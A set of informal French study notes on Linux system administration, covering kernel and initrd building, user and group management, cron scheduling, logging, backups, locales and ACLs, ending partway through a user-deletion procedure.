&lt;h1 id=&quot;chargement-des-modules-au-boot&quot;&gt;Chargement des modules au boot&lt;/h1&gt;
&lt;p&gt;initial ramdisk
initrd: permet de stocker module necessaires au boot car les modules sont dans le DD alors qu’on a pas le module pour monter&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;un initrd par noyau&lt;/li&gt;
  &lt;li&gt;
    &lt;table&gt;
      &lt;tbody&gt;
        &lt;tr&gt;
          &lt;td&gt;son contenu: zcat /boot/initrd….&lt;/td&gt;
          &lt;td&gt;cpio -id –no-absolute-filenames&lt;/td&gt;
        &lt;/tr&gt;
      &lt;/tbody&gt;
    &lt;/table&gt;
  &lt;/li&gt;
  &lt;li&gt;execute le sciprt init à la racine pour charger modules nécessaires&lt;/li&gt;
  &lt;li&gt;puis passe la main à /sbin/init&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;construire-initrd&quot;&gt;construire initrd&lt;/h3&gt;
&lt;p&gt;RH, SUSE: mkinitrd
Debian: mkinitramfs
on peut y ajouter des modules&lt;/p&gt;

&lt;p&gt;maintenant
initramfs
conf: /etc/initramfs-tools
$ mkinitramfs -o /tmp/initrd-$(uname -r)&lt;/p&gt;

&lt;h1 id=&quot;fs-virtuel&quot;&gt;FS virtuel&lt;/h1&gt;
&lt;p&gt;/proc
/sys
FS virtuel avec info sur le système
avant proc tout seul
pas de place mémoire&lt;/p&gt;

&lt;h1 id=&quot;sysctl&quot;&gt;sysctl&lt;/h1&gt;
&lt;p&gt;systemd-sysctl appel sysctl
pour faire modif permanente dans /etc/sysctl.co,f ou .d
sysctl -a
net.ipv4.ip_forward=1&lt;/p&gt;

&lt;h1 id=&quot;compiler-un-noyau&quot;&gt;Compiler un noyau&lt;/h1&gt;
&lt;p&gt;noyau vanilla: brut
sources, configurer, compiler, installer
installer xz-utils
tar tvJf linux-…
source dans /usr/src/linux ou /usr/linux-sources-… ou /usr/src/kernels&lt;/p&gt;

&lt;h3 id=&quot;récupérer-les-sources&quot;&gt;récupérer les sources&lt;/h3&gt;
&lt;p&gt;D: linux-sources-x.y…
RH: kernel-sources&lt;/p&gt;

&lt;h3 id=&quot;config&quot;&gt;config&lt;/h3&gt;
&lt;p&gt;avec le .config
y: intégrer au noyau
m: compiler en module
n: fonctionnalité abscente&lt;/p&gt;

&lt;p&gt;config des anciens noyaux dans /boot
peut le copier et le réutiliser pour le nouveau
ensuite make oldconfig + question pour màj&lt;/p&gt;

&lt;p&gt;make menuconfig + interface avec choix et génére le .config
make xconfig: graphique&lt;/p&gt;

&lt;p&gt;p416: optimisation en désactuvant modules&lt;/p&gt;

&lt;h3 id=&quot;compilation&quot;&gt;compilation&lt;/h3&gt;
&lt;p&gt;make -j 3
long&lt;/p&gt;

&lt;h3 id=&quot;installation-1&quot;&gt;installation&lt;/h3&gt;
&lt;p&gt;make modules_install # install modules dans /lib/modules/noyau
make install # recopie noyau dans /boot&lt;/p&gt;

&lt;p&gt;si pas de initrd
cd /boot
mkinitramfs -o initrd.img-4.9…&lt;/p&gt;

&lt;p&gt;si nouveau noyau non pris en compte:
grub-mkconfig -a /boot/grub/grub.cfg&lt;/p&gt;

&lt;p&gt;make clean # supprimer fichiers objets&lt;/p&gt;

&lt;p&gt;sous yum: make rpm pour créer packahe source, header, noyau&lt;/p&gt;

&lt;h3 id=&quot;les-fichiers-periph&quot;&gt;les fichiers periph&lt;/h3&gt;
&lt;p&gt;dans /dev
créer fichier spécial
mknod /dev/periph&lt;/p&gt;

&lt;h1 id=&quot;connaitre-son-matériel&quot;&gt;Connaitre son matériel&lt;/h1&gt;
&lt;p&gt;bus PCI: lspci
-v: details
-s: spécifier adaptateur
$ lspci -v -s 02:00.0&lt;/p&gt;

&lt;p&gt;bus USB: lsusb
-d: info
-v: info&lt;/p&gt;

&lt;p&gt;kwinfo –short, –cpu –memory
BIOS dmidecode -t processor&lt;/p&gt;

&lt;h1 id=&quot;udev-fs-dynamique-remplace-devfs&quot;&gt;udev, fs dynamique, remplace devfs&lt;/h1&gt;
&lt;p&gt;gere tout /dev
est composant de systemd
lancé comme service classique
noyau génère des events et udev les lit et les interpréte
régles dans /etc/udev/rules.d ou /lib/udev/rules.d&lt;/p&gt;

&lt;p&gt;périph controlé par udev:
udevinfo –query=all -n /dev/sda
ou udevadm info –query=all -n /dev/sdb&lt;/p&gt;

&lt;hr /&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;les-tâches-administratives&quot;&gt;Les tâches administratives&lt;/h1&gt;
&lt;h1 id=&quot;administration-des-utilisateurs&quot;&gt;Administration des utilisateurs&lt;/h1&gt;
&lt;p&gt;identification: savoir qui est qui, pour connaitre les droits (login)
authentification: apporter preuve de qui on est (mdp)&lt;/p&gt;

&lt;p&gt;utilisateur = login + UID + GID
les UID et GID sont dans tables de inodes
GID: groupe principal
UID &amp;lt; 100: comptes spéciaux
UID de root = 0
UID &amp;gt; 100, 500, 1000: user normal
/etc/login.defs&lt;/p&gt;

&lt;p&gt;groupe primaire: utiliser pour créer les fichiers
$ id mourad&lt;/p&gt;

&lt;p&gt;/etc/passwd: liste de user
login
password -&amp;gt; x: /etc/shadow et !: compte vérouillé
UID:GID:comment:home directory:shell&lt;/p&gt;

&lt;p&gt;/etc/group
nom:password:GID
liste des users dont c’est un groupe secondaire
mdp sur un groupe pour éviter de passer en groupe primaire avec newgrp&lt;/p&gt;

&lt;p&gt;/etc/shadow
login
mdp $xx$: type de chiffrement
nb jours depuis 1 janvier 1960 du dernier changement de mdp
nb jours avant lesquels le mdp ne peut pas être changé (0: peut être changé n’importe quand)
nb jours après lesquels le mdp doit être changé
nb jours avant l’expiration du mdp durant lesquels l’utilisateur doit être prévenu
nb jours aprés experiration le compte est désactivé
nb jours depuis 70 desactivation
reservé&lt;/p&gt;

&lt;p&gt;$1$: MD5
$2a$: Blowfish
$5: sha-256
$6: sha-512
autres: DES&lt;/p&gt;

&lt;p&gt;man crypt&lt;/p&gt;

&lt;p&gt;/etc/gshadow
c’est /etc/shadow pour les groupes
nom du groupe:mdp:admin du groupe:membres&lt;/p&gt;

&lt;h1 id=&quot;gestion-des-utilisateurs&quot;&gt;Gestion des utilisateurs&lt;/h1&gt;
&lt;h3 id=&quot;ajout&quot;&gt;ajout&lt;/h3&gt;
&lt;p&gt;ajouter lignes dans
/etc/passwd
/etc/shadow
/etc/group
/etc/gshadow
copie de /etc/skel
changer droits de la copie
changer mdp&lt;/p&gt;

&lt;p&gt;possible à la main, mettre à jour: vipw&lt;/p&gt;

&lt;p&gt;$ useradd mourad
-m: créer home directory
-u: préciser UID
-g: préciser group principal
-G: groupe additionnels, séparés par virgule
-d: chemin home directory
-c: commentaire
-k: chemin vers le skel
-s: shell, avec chsh
-p: mdp chiffré, avec passwd&lt;/p&gt;

&lt;p&gt;créer mdp
$ passwd mourad&lt;/p&gt;
&lt;h3 id=&quot;sécurité-des-mdp&quot;&gt;sécurité des mdp&lt;/h3&gt;
&lt;p&gt;passwd: gérer /etc/shadow
module PAM peut imposer contraintes sur le mdp
root peut changer sans contraintes&lt;/p&gt;

&lt;h3 id=&quot;gérer-info-de-validalité-du-mdp&quot;&gt;gérer info de validalité du mdp&lt;/h3&gt;
&lt;p&gt;passwd et chage
chage -l mourad: info&lt;/p&gt;

&lt;p&gt;modif:
usermod, même option que useradd
-L: lock du compte
-U: unlock
-e &lt;n&gt;: mdp expire aprés n jours
-l: modifier login
-m: move home directory&lt;/n&gt;&lt;/p&gt;

&lt;p&gt;$ chage mourad : intéractive pour changer les dates
$ chage -l mourad: info date pour user&lt;/p&gt;

&lt;h3 id=&quot;suppression&quot;&gt;suppression&lt;/h3&gt;
&lt;p&gt;userdel
-r: supprime home directory&lt;/p&gt;

&lt;h1 id=&quot;gestion-de-groupe&quot;&gt;Gestion de groupe&lt;/h1&gt;
&lt;h3 id=&quot;ajout-1&quot;&gt;ajout&lt;/h3&gt;
&lt;p&gt;groupadd
-g: GID&lt;/p&gt;

&lt;h3 id=&quot;modif&quot;&gt;modif&lt;/h3&gt;
&lt;p&gt;groupmod
-n: renommer
-g: GID, le groupe d’appartenance des fichiers n’est pas modifié&lt;/p&gt;

&lt;h3 id=&quot;suppression-1&quot;&gt;suppression&lt;/h3&gt;
&lt;p&gt;groupdel
vérifier d’abord que ce n’est pas le groupe principale d’un user et ensuite supprimer
vérifier traces du groupe dans tout le système&lt;/p&gt;

&lt;h3 id=&quot;mdp&quot;&gt;mdp&lt;/h3&gt;
&lt;p&gt;gpasswd test
gpasswd -a seb test
ajouter seb dans groupe test&lt;/p&gt;

&lt;p&gt;gpasswd -M seb,steph test # membres groupe
gpasswd -A admin test&lt;/p&gt;

&lt;h1 id=&quot;commandes-additionnelles&quot;&gt;commandes additionnelles&lt;/h1&gt;
&lt;h3 id=&quot;conversion-des-fichiers&quot;&gt;conversion des fichiers&lt;/h3&gt;
&lt;p&gt;pour migration sur system qui ne supporte que passwd et non shadow
shadow + passwd -&amp;gt; unique passwd
avec pwunconv (plus de durée de validité des mdp)
pwconv fait l’inverse
groupe: grpconv et grpunconv&lt;/p&gt;

&lt;h3 id=&quot;vérifier-la-cohérence&quot;&gt;vérifier la cohérence&lt;/h3&gt;
&lt;p&gt;pwck: vérification de passwd et shadow
grpck&lt;/p&gt;

&lt;h3 id=&quot;vérifier-les-connexions&quot;&gt;vérifier les connexions&lt;/h3&gt;
&lt;p&gt;lastlog
se base sur /var/log/lastlog
-u: user
-tn : des n derniers jours&lt;/p&gt;

&lt;p&gt;last
se base sur /var/log/wtmp
ip, date co, date deco, durée co, status&lt;/p&gt;

&lt;h1 id=&quot;action-de-lutilisation&quot;&gt;Action de l’utilisation&lt;/h1&gt;
&lt;p&gt;chsh
-l: affiche /etc/shells
-s: /bin/sh&lt;/p&gt;

&lt;p&gt;chfn: change commentaire&lt;/p&gt;

&lt;p&gt;newgrp mon_groupe: change groupe principal temporairement qui doit être secondaire ou avoir mdp
newgrp seul: revenir en arrière&lt;/p&gt;

&lt;p&gt;changer identité
su (substitute user)
su - seb: charger en + l’environnement
su -c “make install”
sg pour les groupes&lt;/p&gt;

&lt;p&gt;intéroger système
getent: intérogger les systèmes en passant par ses biblio NSS(name server, switch sans passer pas fichiers locaux mais par LDAP, NIS, AD)
getent passwd
getent shadow
getent group
getent gshadow&lt;/p&gt;

&lt;p&gt;configuration avancée
/etc/login.defs: utilisé par pas mal de commande pour des valeurs par d”faut ou régles&lt;/p&gt;

&lt;p&gt;notification à l’utilisateur
/etc/issue: message d’accueil
/etc/issue.net: message d’accueil depuis ssh
/etc/motd: message of the day
wal, write et mesg
wall: pour tous les users
write: pr 1 utilisateur
mesg y/n; recevoir ou non les messages&lt;/p&gt;

&lt;h1 id=&quot;lenvironnement-utilisateur&quot;&gt;l’environnement utilisateur&lt;/h1&gt;
&lt;p&gt;/etc/skel (skeleton): copié dans les homes
/etc/profile: définit PATH, LOGNAME, USER, HOSTNAME HISTSIZE, MAIL, INPUTRC
/etc/profile.d/*
~/.bash_profile
~/.bashrc
/etc/bashrc&lt;/p&gt;

&lt;h1 id=&quot;apercu-de-pam&quot;&gt;apercu de PAM&lt;/h1&gt;
&lt;p&gt;pluggable authentification modules
ensemble de modules, biblio, pour mettre en place des systèmes d’authentification avancés
unix classique, LDAP, AD&lt;/p&gt;

&lt;h1 id=&quot;limpression&quot;&gt;l’impression&lt;/h1&gt;
&lt;h3 id=&quot;principe&quot;&gt;principe&lt;/h3&gt;
&lt;p&gt;3 standards sous Unix, sous sytem V, sous BSD
imprimantes dans /etc/printcap avec file d’attente (queue)
pour imprimer documents formatés ou images, il faut (pilotes) filtres d’impression entre le doc et la communication
prendre imprimante compatible avec Postscript&lt;/p&gt;

&lt;p&gt;system V: lp
BSD: lpr&lt;/p&gt;

&lt;p&gt;CUPS: commun unix printing system
système d’impression Unix orienté réseau, IPP avec HTTP
cupsd localhost:631
/etc/cups/cupsd.conf&lt;/p&gt;

&lt;h1 id=&quot;automatisation&quot;&gt;Automatisation&lt;/h1&gt;
&lt;h3 id=&quot;avec-cron&quot;&gt;avec cron&lt;/h3&gt;
&lt;p&gt;avec crontab
crontab -e: editer tab perso
sont dans /var/spool/cron/*
service cron doit tourner
min heure jour_du_mois mois jour_semaine cmd
15 ou 15,16,20 ou 15-30 ou *
0: lundi
*/5: toutes les 5 min
2-57/5: 2,7,12,…
crontab -l: crontabs actives
crontab -r: supprimer
crontab -u user: editer&lt;/p&gt;

&lt;p&gt;crontab système + utilisateur
/etc/crontab
on peut préciser var. d’environnement
run-parts: prend en param un repertoire et exécute tous les programmes qui sont à l’intérieur
logrotate: effectue sauvegarde et renomme fichiers de logs et journaux
tmpwatch: chargé de nettoyer le sys de fichiers inutilisé (/tmp)
/etc/crond.d/ au système&lt;/p&gt;

&lt;p&gt;contrôle d’accés
/etc/cron.allow
/etc/cron.deny&lt;/p&gt;

&lt;h3 id=&quot;avec-at&quot;&gt;avec at&lt;/h3&gt;
&lt;p&gt;atd (at deamon)
modif vilatiles
at 21:20: donner commandes et EOL
at -f /home/seb/test.sh  21:25
heure: hhmm ou hh:mm
MMJJAA ou xx/xx/xx
…&lt;/p&gt;

&lt;p&gt;batch: execute lorsque la charge de la machine est basse
atq (at queue): tâche programmés
/var/spool/atjobs: 1 executable par tâche
atrm 10: supprimer un job&lt;/p&gt;

&lt;p&gt;contrôle d’accés
/etc/at.allow
/etc/at.deny&lt;/p&gt;

&lt;h3 id=&quot;avec-anacron&quot;&gt;avec anacron&lt;/h3&gt;
&lt;p&gt;/etc/anacrontab
anacron peut remplacer cron sur machine souvent éteinte
cmd exécuté dés que la période est atteinte ou dépassée
execution périodique
periode delai identifiant cmd
7 10 cron.weekly nice runparts –report /etc/cron.weekly
tous les 7 jours, 10 min après le lancement&lt;/p&gt;

&lt;h1 id=&quot;les-traces-logs-du-sytème&quot;&gt;Les traces (logs) du sytème&lt;/h1&gt;
&lt;h3 id=&quot;principe-1&quot;&gt;principe&lt;/h3&gt;
&lt;p&gt;services spécialisés dans la réception de message pour les logs
klogd: kernel log deamon, emis par kernel
syslogd: sys log deamon, emis par services (+ un peu kernel)
journald: composant de systemd, tout service
(syslog-ng ou rsyslog)&lt;/p&gt;

&lt;p&gt;klogd
gére logs emis par noyau&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;2 src d’accés: /proc (/proc/kmsg): s’il est présent,&lt;/li&gt;
  &lt;li&gt;appels système via API (sys_syslog) si /proc est absent, ou explicite&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;message noyau avec niveaux
0: EMERG: sys inutilisable
1: ALERT: action doit être prise immédiatement
2: CRIT: prob. critique
3: ERR: erreur
4: WARNING: avertissement
5: NOTICE: normal mais nécessite attention particulière
6: INFO: info standard
7: DEBUG: trace debug noyau&lt;/p&gt;

&lt;p&gt;klogd: envoi 0-6 à syslogd
7: ne sont pas tracés par défaut&lt;/p&gt;

&lt;h3 id=&quot;configuration-syslog&quot;&gt;configuration syslog&lt;/h3&gt;
&lt;p&gt;/etc/syslog.conf
permet de définir l’origine, l’importance et la dest de chaque message, sous forme de 2 champs
l’origine:
auth,authpriv: secu et authentification
cron: service cron
deamon: demons sys
kern: noyau
lpr: service d’impression
mail: messagerie
news: le réseau
syslog: syslog lui-même
user: message des process utilisateurs
uucp: Unix to Unix CoPy
local 0-&amp;gt;7: issus de klogd&lt;/p&gt;

&lt;p&gt;l’importance
emerg
alert
crit
err
warning
notice
info
debug
none: ignorer les mess&lt;/p&gt;

&lt;p&gt;la destination
fichier&lt;/p&gt;

&lt;p&gt;envoyer message à syslogd avec “logger”&lt;/p&gt;

&lt;h3 id=&quot;cas-de-rsyslog&quot;&gt;cas de rsyslog&lt;/h3&gt;
&lt;p&gt;/etc/rsyslog.conf&lt;/p&gt;

&lt;h3 id=&quot;systemd-et-journal&quot;&gt;systemd et journal&lt;/h3&gt;
&lt;p&gt;journal démarré par systemd
avec des avantages
stocké en binaire dans /run/log/journal
le FS /run est volatile, vidé à chaque redémarrage, on des places vers /var
mkdir /var/log/journal
systemd-tmpfils –create –prefix /var/log/journal
systemctl restart systemd-journald
commande journalctl pourexploitation
/etc/systemd/journal.conf
options: p486&lt;/p&gt;

&lt;h3 id=&quot;les-fichiers-de-traces&quot;&gt;les fichiers de traces&lt;/h3&gt;
&lt;p&gt;/var/log&lt;/p&gt;

&lt;h3 id=&quot;journalctl-1&quot;&gt;journalctl&lt;/h3&gt;
&lt;p&gt;accéder aux traces stockés par journalctl
journalctl -f: tail -f
journalctl _SYSTEMD_UNIT=ssh.service
ajouter option à la fin
since: -S “2017-01-29 09:00:00”
until: -U “2017-01-29 09:00:00”&lt;/p&gt;

&lt;p&gt;-o: modifier format de sortie&lt;/p&gt;

&lt;h1 id=&quot;archivage-et-backup&quot;&gt;Archivage et backup&lt;/h1&gt;
&lt;h3 id=&quot;les-outils-de-sauvegarde&quot;&gt;les outils de sauvegarde&lt;/h3&gt;
&lt;p&gt;tar: fichier et arborescences (ou cpio)
dd (dump): sauv physqiue de disque ou de FS
sauv incrémentale (première grosse et des petites)
autre solution Networker
plan de sauvegarde
les trucs à protéger ?&lt;/p&gt;

&lt;h3 id=&quot;autres-commandes&quot;&gt;autres commandes&lt;/h3&gt;
&lt;p&gt;mt: contrôle d’une bande magnétique
touch: màj date de last modif pour forcer sauv. incrémental
find: selectionner fichiers à sauv
compress et uncompress des fichiers
gzip, gunzip, zcat
xz, unxy, xzcat&lt;/p&gt;

&lt;h3 id=&quot;tar&quot;&gt;tar&lt;/h3&gt;
&lt;p&gt;simple et efficace
pour créer archives
tar cvf desktop.tar Desktop/
-c: créer archive
-v: verbeu
-f: nom archive&lt;/p&gt;

&lt;p&gt;lister:
tab tcf desktop.tar&lt;/p&gt;

&lt;p&gt;resauration
tar xvf desktop.tar
-x: extraction&lt;/p&gt;

&lt;p&gt;autres param
compression:
-z: gzip
-Z: compress
-j: bzip2
-J: xy&lt;/p&gt;

&lt;p&gt;tar cvzf desktop.tar.gz Desktop/&lt;/p&gt;

&lt;h3 id=&quot;cpio&quot;&gt;cpio&lt;/h3&gt;
&lt;p&gt;sauvergarde sur la sortie standard
les fichiers de sont entré standard (redirection)
ne compress pas les archives
cpio -oL
-o: output, création de la sauv en sortie
-L: sauvegarder les fichiers et pas les liens s.
-v: verbose
-c: sauvegarder des attributs des fichiers ss-forme ASCII
find Desktop -rpint | cpio -ocv | gzip &amp;gt; archive.cpio.gz&lt;/p&gt;

&lt;p&gt;lister
cpio -it archive
-i: lecture de l’archive en entrée
-t: lister contenu
cat archive.cpio.gz | gzip -cd | cpio -it
restaurer
prec + | cpio -iuvd&lt;/p&gt;

&lt;h3 id=&quot;dd&quot;&gt;dd&lt;/h3&gt;
&lt;p&gt;device to device
copie physique, bloc par bloc d’un fichier periph vers un autre
créer fichier vide de 1Mo
dd if=/dev/zero of=vide les=446 count=1024
count: nb blocs à copier&lt;/p&gt;

&lt;h3 id=&quot;lhorloge&quot;&gt;l’horloge&lt;/h3&gt;
&lt;p&gt;connaitre l’heure
date
strftime en C
date avec pleins d’options&lt;/p&gt;

&lt;h3 id=&quot;ntp&quot;&gt;NTP&lt;/h3&gt;
&lt;p&gt;network time protocol
synchro de horloges&lt;/p&gt;

&lt;h1 id=&quot;les-param-régionaux&quot;&gt;les param régionaux&lt;/h1&gt;
&lt;p&gt;dpkg-reconfigure locales
LANG
D,U: /etc/default/locale
RH: /etc/locale.conf
SuSE: /etc/sysconfig/language&lt;/p&gt;

&lt;p&gt;LANG=fr_FR.UTF-8
langue_Pays[.norme][@variante]&lt;/p&gt;

&lt;p&gt;export LANG=en_US.UTF-8&lt;/p&gt;

&lt;p&gt;supporté par système:
locale -a
/usr/share/locale
toutes les variables LC implique format mais LANG les surclasses&lt;/p&gt;

&lt;h3 id=&quot;fuseaux-horaire-timezone&quot;&gt;fuseaux horaire, timezone&lt;/h3&gt;
&lt;p&gt;D,U: dpkg-reconfigure tzdata ou timedatectl
RH7: timedatectl
RH6: system-config-date, redhat-config-date
autres: timedatctl&lt;/p&gt;

&lt;p&gt;/etc/timezone continent/ville
/etc/localtime binaire,info sur timezone
avec decalage + changement d’heures&lt;/p&gt;

&lt;p&gt;les fichiers de conf des timezones
/usr/share/zoneinfo
/usr/share/zoneinfo/Europe/Paris
lins s. de /et/localtime lors de config
echo $T2&lt;/p&gt;

&lt;p&gt;codage des caractères
unicode pour tout simplifier
unicode UTF-8
iconv -f WINDOWS-1252 -t UTF8 nom_fichier&lt;/p&gt;

&lt;h1 id=&quot;acl&quot;&gt;ACL&lt;/h1&gt;
&lt;p&gt;Be able to add a right system to classic POSIX system (owner, group, other).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setfacl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; u:mourad:rx ./mon_fichier
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setfacl &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; g:grp_admin:rwx ./mon_fichier

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setfacl &lt;span class=&quot;nt&quot;&gt;-bm&lt;/span&gt; u:mourad:rx ./mon_fichier &lt;span class=&quot;c&quot;&gt;# default&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;setfacl &lt;span class=&quot;nt&quot;&gt;-Rbm&lt;/span&gt; u:mourad:rx ./mon_fichier &lt;span class=&quot;c&quot;&gt;# reccursive&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;getfacl ./mon_fichier

setfact &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# delete all permission&lt;/span&gt;
setfact &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# delete just default permission&lt;/span&gt;
setfact &lt;span class=&quot;nt&quot;&gt;-x&lt;/span&gt; u:mourad:rx &lt;span class=&quot;c&quot;&gt;# delete particular line&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;colors&quot;&gt;Colors&lt;/h1&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;NC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\033[0m'&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Aucune couleur&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Red&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\033[0;31m'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Green&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\033[0;32m'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;Yellow&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\033[0;33m'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;LINE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;____________________________________________________________&quot;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; /home/test.txt &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;#touch /home/test.txt&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-eq&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LINE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; [&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Green&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; OK &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NC&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Creating /home/test.txt &quot;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;else
     &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LINE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; [&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Red&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; FAIL &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NC&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Creating /home/test.txt &quot;&lt;/span&gt;
 &lt;span class=&quot;k&quot;&gt;fi
else
   &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;LINE&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; [&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;Yellow&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; ALREADY EXISTS &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NC&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Creating /home/test.txt &quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;userdel&quot;&gt;Userdel&lt;/h1&gt;
&lt;!--more--&gt;
&lt;p&gt;On veut supprimer l’utilisateur jean&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# lock account&lt;/span&gt;
passwd &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; jean

&lt;span class=&quot;c&quot;&gt;# backup&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-zcvf&lt;/span&gt; /var/backup/account/deleted/j/jean.&lt;span class=&quot;nv&quot;&gt;$uid&lt;/span&gt;.&lt;span class=&quot;nv&quot;&gt;$now&lt;/span&gt;.tar.gz /home/jean/

&lt;span class=&quot;c&quot;&gt;# running process&lt;/span&gt;
ps &lt;span class=&quot;nt&quot;&gt;-fp&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;pgrep &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jean&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
killall &lt;span class=&quot;nt&quot;&gt;-KILL&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; jean

